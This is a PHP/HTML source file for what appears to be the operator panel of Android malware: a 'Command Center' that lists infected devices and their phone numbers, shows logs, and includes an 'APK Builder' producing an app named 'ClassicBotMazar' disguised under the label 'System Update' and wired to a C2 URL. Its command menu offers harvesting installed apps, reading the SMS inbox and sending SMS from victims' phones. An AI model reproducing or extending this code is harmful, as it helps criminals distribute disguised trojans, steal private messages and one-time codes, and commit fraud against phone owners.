<?php
require_once __DIR__ . '/../database.php';
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Management Panel</title>
    <link rel="stylesheet" href="css/modern.css">
</head>
<body>
    <div class="container">
        <header>
            <h1>Command Center</h1>
            <div class="stats">
                <span>Devices: <b id="deviceCount">0</b></span>
                <span>Online: <b id="onlineCount" style="color:var(--success)">0</b></span>
                <span>Offline: <b id="offlineCount" style="color:var(--error)">0</b></span>
            </div>
        </header>

        <div class="tabs">
            <button class="tab-button active" onclick="switchTab('devices')">Devices</button>
            <button class="tab-button" onclick="switchTab('logs')">Logs</button>
            <button class="tab-button" onclick="switchTab('builder')">APK Builder</button>
        </div>

        <div id="devices-tab" class="tab-content active">
            <div class="card">
                <div class="toolbar" style="display:flex; justify-content:space-between; margin-bottom:1rem;">
                    <input type="text" id="deviceSearch" placeholder="Search devices..." onkeyup="filterDevices()" style="max-width:300px">
                    <div class="actions">
                        <button onclick="selectAll()" class="btn-primary" style="background:var(--border)">Select All</button>
                        <button id="sendCommandBtn" onclick="showCommandModal()" class="btn-primary" disabled>Send Command</button>
                    </div>
                </div>
                <div class="table-container">
                    <table id="devicesTable" style="width:100%; border-collapse:collapse">
                        <thead>
                            <tr style="text-align:left; color:var(--text-muted); border-bottom:1px solid var(--border)">
                                <th style="padding:1rem"><input type="checkbox" id="selectAllCheckbox" onchange="toggleSelectAll()"></th>
                                <th>ID</th>
                                <th>Model</th>
                                <th>Numbers</th>
                                <th>Status</th>
                                <th>Action</th>
                            </tr>
                        </thead>
                        <tbody id="devicesTableBody"></tbody>
                    </table>
                </div>
            </div>
        </div>

        <div id="logs-tab" class="tab-content">
            <div class="card">
                <input type="text" id="logSearch" placeholder="Filter logs..." onkeyup="filterLogs()" style="margin-bottom:1rem">
                <table id="logsTable" style="width:100%">
                    <tbody id="logsTableBody"></tbody>
                </table>
            </div>
        </div>

        <div id="builder-tab" class="tab-content">
            <div class="card" style="max-width: 600px; margin: 0 auto;">
                <h2 style="margin-top:0">APK Configuration</h2>
                <div class="form-group">
                    <label>File Name</label>
                    <input type="text" id="apkName" value="ClassicBotMazar">
                </div>
                <div class="form-group">
                    <label>App Label</label>
                    <input type="text" id="appLabel" value="System Update">
                </div>
                <div class="form-group">
                    <label>C2 URL</label>
                    <input type="text" id="c2Url" value="http://<?php echo $_SERVER['HTTP_HOST']; ?>/c2/">
                </div>
                <button onclick="buildApk()" id="buildBtn" class="btn-primary" style="width:100%">Generate APK</button>
                
                <div id="buildStatus" style="margin-top: 1.5rem; display: none;">
                    <p id="statusMessage"></p>
                    <div id="downloadLink" style="display: none; margin-bottom: 1rem;">
                        <a id="apkDownloadBtn" href="#" class="btn-primary" style="display:block; text-align:center; background:var(--success); text-decoration:none">Download Build</a>
                    </div>
                    <details>
                        <summary style="color:var(--text-muted); cursor:pointer">Console Output</summary>
                        <pre id="buildLog"></pre>
                    </details>
                </div>
            </div>
        </div>
    </div>
    </div>

    <div id="commandModal" class="modal">
        <div class="modal-content">
            <div class="modal-header">
                <span class="close" onclick="closeCommandModal()">&times;</span>
                <h2>Send Command</h2>
            </div>
            <div class="modal-body">
                <p id="selectedDevicesInfo"></p>
                <label for="commandSelect">Command:</label>
                <select id="commandSelect" onchange="updateCommandFields()">
                    <option value="">-- Select Command --</option>
                    <option value="getAppsAll">getAppsAll - Get all installed apps</option>
                    <option value="getSmsInbox">getSmsInbox - Get SMS inbox</option>
                    <option value="sendSMS">sendSMS - Send SMS message</option>
                </select>
                
                <div id="sendSMSFields" style="display: none; margin-top: 15px;">
                    <label for="phoneNumber">Phone Number:</label>
                    <input type="text" id="phoneNumber" placeholder="+38000000000">
                    
                    <label for="smsMessage" style="margin-top: 10px;">Message:</label>
                    <textarea id="smsMessage" placeholder="Enter message text..."></textarea>
                    
                    <label for="simSlot" style="margin-top: 10px;">SIM Slot (0 or 1):</label>
                    <input type="number" id="simSlot" value="0" min="0" max="1">
                </div>
            </div>
            <div class="modal-footer">
                <button onclick="closeCommandModal()" class="btn-secondary">Cancel</button>
                <button onclick="sendCommand()" class="btn-primary">Send</button>
            </div>
        </div>
    </div>

    <script src="js/api.js"></script>
    <script src="js/pagination.js"></script>
    <script src="js/deviceCount.js"></script>
    <script src="js/devices.js"></script>
    <script src="js/logs.js"></script>
    <script src="js/tabs.js"></script>
    <script src="js/main.js"></script>
</body>
</html>

